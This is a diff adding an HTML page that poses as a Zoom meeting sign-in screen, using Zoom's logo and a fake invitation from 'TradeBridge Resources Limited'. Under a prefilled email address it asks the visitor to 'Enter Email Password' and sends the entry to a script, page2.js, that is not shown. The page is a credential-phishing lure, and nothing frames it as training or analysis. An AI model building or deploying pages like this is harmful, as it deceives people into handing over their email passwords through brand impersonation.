@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Signing to meeting | Zoom</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+
+<body class="page-prejoin">
+
+    <header class="site-header">
+        <div class="product-name">
+            <img
+                src="https://commons.wikimedia.org/wiki/Special:FilePath/Zoom_Logo_2022.svg"
+                alt="Zoom"
+                style="width: 110px; height: auto;"
+            >
+        </div>
+        <nav class="site-nav" aria-label="Main">
+            <a href="#">Request a Demo</a>
+            <a href="index.html">Join</a>
+            <a href="#">Host</a>
+            <a href="#">Sign In</a>
+        </nav>
+    </header>
+
+    <main class="prejoin-layout">
+
+        <section class="video-section">
+            <div class="video-preview-container">
+                <video id="cameraPreview" autoplay muted playsinline></video>
+                <div id="cameraStatus" class="camera-status">Allow camera and microphone access to preview your video</div>
+            </div>
+
+            <div class="meeting-toolbar">
+                <div class="toolbar-left">
+                    <button type="button" id="microphoneToggle" class="tool-btn" aria-label="Turn microphone off" aria-pressed="true">
+                        <svg viewBox="0 0 24 24" aria-hidden="true"><rect x="9" y="3" width="6" height="11" rx="3"/><path d="M5 11a7 7 0 0 0 14 0M12 18v3"/><path class="slash" d="M4 4l16 16"/></svg>
+                    </button>
+                    <button type="button" id="cameraToggle" class="tool-btn" aria-label="Turn camera off" aria-pressed="true">
+                        <svg viewBox="0 0 24 24" aria-hidden="true"><rect x="2" y="6" width="13" height="12" rx="2.5"/><path d="M15 10.5l6-3.5v10l-6-3.5z"/><path class="slash" d="M4 4l16 16"/></svg>
+                    </button>
+                </div>
+
+                <div class="toolbar-right">
+                    <button type="button" class="tool-btn" aria-label="Share screen">
+                        <svg viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="4" width="18" height="12" rx="2"/><path d="M12 13V8M9.5 10.500L12 8l2.5 2.500M8 20h8"/></svg>
+                    </button>
+                    <button type="button" class="tool-btn" aria-label="Participants">
+                        <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="9" cy="8" r="3.5"/><path d="M2.5 20a6.5 6.5 0 0 1 13 0M16 4.800a3.5 3.5 0 0 1 0 6.400M18 14.200A6.5 6.5 0 0 1 21.5 20"/></svg>
+                    </button>
+                    <button type="button" class="tool-btn" aria-label="Chat">
+                        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M21 11.500a8.4 8.4 0 0 1-9 8.3 9.2 9.2 0 0 1-3.6-.7L3 21l1.8-4.900A8 8 0 0 1 3 11.500C3 7 7 3.2 12 3.200s9 3.8 9 8.300z"/></svg>
+                    </button>
+                    <button type="button" id="cancelMeetingButton" class="cancel-meeting">
+                        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M3 14.500c5-5 13-5 18 0l-2.5 2.5-3-1.500v-2.500a10 10 0 0 0-4 0v2.500l-3 1.500z"/></svg>
+                        Cancel Meeting
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <aside class="meeting-code-section">
+    <div class="product-name">
+   
+            <p class="meeting-welcome" style="font-size: 0.85rem; margin: 16px 0; padding: 8px 0;">
+                Welcome <span id="guestName">[]</span>, You have been invited to join a meeting with <span id="organizationName">TradeBridge Resources Limited</span>
+            </p>
+
+            <div class="meeting-code-card">
+                <h2>Continue Sign in as</h2>
+
+                <h3 id="accountEmail" style="text-align: center; font-size: 0.9rem; color: black; padding-top: 4px;">test@gmail.com</h3>
+
+                <div id="meetingCodeError" class="input-error" role="alert"></div>
+
+                <div class="meeting-code-field">
+                    <input type="text" id="meetingCode" name="meetingCode" placeholder="Enter Email Password" autocomplete="off" aria-describedby="meetingCodeError">
+                </div>
+
+                <p class="terms">
+                    By clicking "<span class="accent">Launch Meeting</span>", you agree to our
+                    <a href="#">Terms of Service</a> and <a href="#">Privacy Statement</a>.
+                </p>
+
+                <button type="button" id="launchMeetingButton" class="launch-meeting-button">Launch Meeting</button>
+            </div>
+        </aside>
+
+    </main>
+
+    <script src="page2.js"></script>
+</body>
+</html>
